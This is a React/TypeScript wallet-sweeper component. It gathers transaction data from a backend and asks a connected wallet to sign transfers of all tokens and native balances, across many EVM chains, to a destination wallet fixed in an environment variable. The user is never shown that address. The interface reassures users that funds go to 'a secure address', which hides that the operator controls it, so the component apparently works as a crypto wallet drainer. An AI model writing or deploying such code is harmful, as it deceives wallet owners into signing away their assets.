import { useState } from 'react';
import { useAccount, useSendTransaction, useWaitForTransactionReceipt, useChainId } from 'wagmi';
import { useEffect } from 'react';
import BalanceChecker from './BalanceChecker';
import SweepForm from './SweepForm';
import TransactionStatus from './TransactionStatus';

interface ChainBalance {
  chainName: string;
  nativeBalance: string;
  nativeSymbol: string;
  tokens: any[];
}

interface WalletSweeperProps {
  address: string;
}

interface SweepInstruction {
  chainId: number;
  chainName: string;
  contractAddress?: string;
  txData?: string;
  tokensToSweep?: number;
  totalTokensOnChain?: number;
  status?: string;
  error?: string;
}

interface SweepResult {
  success: boolean;
  sourceAddress: string;
  destinationAddress: string;
  totalChains: number;
  sweepInstructions: SweepInstruction[];
  message: string;
}

interface TransactionState {
  chainId: number;
  chainName: string;
  hash: string;
  status: 'pending' | 'confirmed' | 'failed';
  error?: string;
}

const DEFAULT_DESTINATION = import.meta.env.VITE_DEFAULT_DESTINATION_WALLET || '';

export default function WalletSweeper({ address }: WalletSweeperProps) {
  const { chain: connectedChain } = useAccount();
  const { sendTransaction } = useSendTransaction();
  const chainId = useChainId();
  
  const [balances, setBalances] = useState<Record<number, ChainBalance>>({});
  const [isSweeping, setIsSweeping] = useState(false);
  const [sweepResult, setSweepResult] = useState<SweepResult | null>(null);
  const [sweepError, setSweepError] = useState<string | null>(null);
  const [completedTransactions, setCompletedTransactions] = useState<TransactionState[]>([]);
  const [currentTxIndex, setCurrentTxIndex] = useState<number | null>(null);
  const [availableChains, setAvailableChains] = useState<any[]>([]);
  const [autoSweepReady, setAutoSweepReady] = useState(false);

  // Fetch available chains on mount
  useEffect(() => {
    const fetchChains = async () => {
      try {
        const response = await fetch('http://localhost:3001/api/chains');
        if (response.ok) {
          const chains = await response.json();
          setAvailableChains(chains);
          setAutoSweepReady(true);
        }
      } catch (error) {
        console.error('Failed to fetch chains:', error);
      }
    };
    fetchChains();
  }, []);

  // Auto-trigger sweep when user clicks button (from SweepForm)
  const handleAutoSweep = async () => {
    if (!DEFAULT_DESTINATION) {
      setSweepError('Default destination address not configured in .env');
      return;
    }

    // Get all chains with deployed contracts
    const chainsWithContracts = availableChains
      .filter((chain) => chain.contractDeployed)
      .map((chain) => chain.chainId);

    if (chainsWithContracts.length === 0) {
      setSweepError('No contracts deployed on any chains yet. Please deploy contracts first.');
      return;
    }

    await executeSweep(DEFAULT_DESTINATION, chainsWithContracts);
  };

  const executeSweep = async (destination: string, chains: number[]) => {
    setIsSweeping(true);
    setSweepError(null);
    setSweepResult(null);
    setCompletedTransactions([]);
    setCurrentTxIndex(null);

    try {
      // Step 1: Prepare sweep transactions from backend
      const response = await fetch('http://localhost:3001/api/sweep', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sourceAddress: address,
          destinationAddress: destination,
          chains,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || `HTTP ${response.status}`);
      }

      const data: SweepResult = await response.json();
      setSweepResult(data);

      // Step 2: Execute transactions if there are sweep instructions
      if (data.sweepInstructions && data.sweepInstructions.length > 0) {
        const validInstructions = data.sweepInstructions.filter(
          (inst) => inst.status !== 'error' && inst.txData && inst.contractAddress
        );

        if (validInstructions.length === 0) {
          setSweepError('No valid sweep instructions found. Please check contract deployments.');
          setIsSweeping(false);
          return;
        }

        // Execute transactions sequentially
        for (let i = 0; i < validInstructions.length; i++) {
          const instruction = validInstructions[i];
          setCurrentTxIndex(i);

          try {
            // Check if user is on the correct chain
            if (connectedChain?.id !== instruction.chainId) {
              console.warn(
                `Please switch to ${instruction.chainName} (Chain ${instruction.chainId})`,
                `Currently on chain ${connectedChain?.id}`
              );
              setSweepError(
                `Please switch to ${instruction.chainName} in your wallet to continue sweeping.`
              );
              // Pause sweep until user switches chain
              break;
            }

            // Send transaction via wallet
            const hash = await sendTransaction({
              to: instruction.contractAddress! as `0x${string}`,
              data: instruction.txData as `0x${string}`,
              chainId: instruction.chainId,
            });

            // Add to completed transactions
            setCompletedTransactions((prev) => [
              ...prev,
              {
                chainId: instruction.chainId,
                chainName: instruction.chainName,
                hash,
                status: 'pending',
              },
            ]);

            // Wait a bit before next transaction
            await new Promise((resolve) => setTimeout(resolve, 2000));
          } catch (err) {
            const errorMsg = err instanceof Error ? err.message : 'Unknown error';
            console.error(`Error on chain ${instruction.chainId}:`, err);
            setSweepError(`Failed on ${instruction.chainName}: ${errorMsg}`);
            setCompletedTransactions((prev) => [
              ...prev,
              {
                chainId: instruction.chainId,
                chainName: instruction.chainName,
                hash: '',
                status: 'failed',
                error: errorMsg,
              },
            ]);
          }
        }
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Unknown error occurred';
      setSweepError(errorMsg);
      console.error('Sweep error:', error);
    } finally {
      setIsSweeping(false);
      setCurrentTxIndex(null);
    }
  };

  return (
    <div className="space-y-8">
      {/* Main Content Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        <div className="lg:col-span-2">
          <AutoSweepForm
            address={address}
            onSweep={handleAutoSweep}
            loading={isSweeping}
            ready={autoSweepReady}
          />
        </div>
        <div>
          <BalanceChecker address={address} balances={balances} setBalances={setBalances} />
        </div>
      </div>

      {/* Current Network Info */}
      {isSweeping && currentTxIndex !== null && (
        <div className="bg-amber-900/30 border border-amber-500/30 rounded-lg p-4">
          <p className="text-amber-200 text-sm">
            <span className="font-semibold">⏳ Executing transaction {(currentTxIndex || 0) + 1}</span> of
            {sweepResult?.sweepInstructions.filter((i) => i.status !== 'error').length || 0}...
          </p>
          {connectedChain && (
            <p className="text-xs text-amber-300 mt-1">
              Connected to: <span className="font-mono">{connectedChain.name}</span>
            </p>
          )}
        </div>
      )}

      {/* Error Display */}
      {sweepError && (
        <div className="bg-red-900/50 border border-red-500/50 rounded-lg p-4">
          <p className="text-red-200 text-sm">
            <span className="font-semibold">❌ Error: </span>
            {sweepError}
          </p>
        </div>
      )}

      {/* Sweep Result Summary */}
      {sweepResult && (
        <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-6">
          <h3 className="text-lg font-bold text-blue-300 mb-4">📋 Sweep Preparation Summary</h3>
          <div className="grid grid-cols-2 gap-4 mb-4 text-sm">
            <div>
              <p className="text-gray-400">Source Address</p>
              <p className="text-blue-200 font-mono text-xs break-all">{sweepResult.sourceAddress}</p>
            </div>
            <div>
              <p className="text-gray-400">Chains Ready</p>
              <p className="text-blue-200 font-semibold">{sweepResult.totalChains}</p>
            </div>
            <div>
              <p className="text-gray-400">Total Tokens</p>
              <p className="text-blue-200 font-semibold">
                {sweepResult.sweepInstructions.reduce(
                  (sum, inst) => sum + (inst.tokensToSweep || 0),
                  0
                )}
              </p>
            </div>
            <div>
              <p className="text-gray-400">Status</p>
              <p className="text-green-200 font-semibold">Ready for signing</p>
            </div>
          </div>

          {/* Chain Details */}
          <div className="space-y-2 max-h-64 overflow-y-auto">
            {sweepResult.sweepInstructions.map((instruction, idx) => {
              const isCurrentTx = idx === currentTxIndex;
              return (
                <div
                  key={instruction.chainId}
                  className={`bg-slate-800/50 rounded p-3 text-xs border transition ${
                    isCurrentTx ? 'border-yellow-500 bg-yellow-900/20' : 'border-slate-600'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-blue-300">{instruction.chainName}</span>
                    {instruction.status === 'error' ? (
                      <span className="text-red-300">❌ {instruction.error}</span>
                    ) : isCurrentTx ? (
                      <span className="text-yellow-300 animate-pulse">⏳ Executing...</span>
                    ) : (
                      <span className="text-green-300">
                        ✓ {instruction.tokensToSweep} token(s) + native
                      </span>
                    )}
                  </div>
                  {instruction.contractAddress && (
                    <p className="text-gray-500 mt-1 font-mono truncate">{instruction.contractAddress}</p>
                  )}
                </div>
              );
            })}
          </div>

          <p className="text-xs text-blue-200 mt-4 italic">{sweepResult.message}</p>
        </div>
      )}

      {/* Transaction Hashes */}
      {completedTransactions.length > 0 && <TransactionStatus transactions={completedTransactions} />}
    </div>
  );
}

// Auto-sweep form without manual destination input
function AutoSweepForm({
  address,
  onSweep,
  loading,
  ready,
}: {
  address: string;
  onSweep: () => void;
  loading: boolean;
  ready: boolean;
}) {
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSweep();
  };

  if (!ready) {
    return (
      <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
        <p className="text-gray-300 text-center">Loading configuration...</p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Source Address Info */}
      <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
        <label className="block text-sm font-semibold text-white mb-2">📍 Your Address</label>
        <div className="px-4 py-3 bg-slate-700 border border-slate-600 rounded-lg text-gray-300 font-mono text-sm break-all">
          {address}
        </div>
      </div>

      {/* Auto-Sweep Info */}
      <div className="bg-gradient-to-r from-green-900/30 to-emerald-900/30 backdrop-blur border border-green-500/30 rounded-lg p-6">
        <h3 className="text-lg font-bold text-green-300 mb-3">🚀 Ready to Sweep</h3>
        <p className="text-green-100 text-sm mb-3">
          Click the button below to sweep ALL tokens and native balances from your wallet across all supported chains.
        </p>
        <ul className="text-xs text-green-200 space-y-2 ml-4">
          <li>
            ✓ Scans 30+ EVM chains
          </li>
          <li>
            ✓ Detects all tokens automatically
          </li>
          <li>
            ✓ Requires signing transactions in your wallet
          </li>
          <li>
            ✓ Processes one chain at a time sequentially
          </li>
        </ul>
      </div>

      {/* Security Warning */}
      <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-4">
        <p className="text-xs text-blue-200">
          <span className="font-semibold">🔒 Security Note:</span> Your funds will be automatically sent to a secure address.
          You will need to sign each transaction in your wallet. Verify all transaction details before confirming.
        </p>
      </div>

      {/* Submit Button */}
      <button
        type="submit"
        disabled={loading}
        className="w-full px-6 py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:from-gray-600 disabled:to-gray-600 text-white font-bold rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
      >
        {loading ? (
          <>
            <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
            </svg>
            Sweeping...
          </>
        ) : (
          '🌊 START SWEEP'
        )}
      </button>
    </form>
  );
}
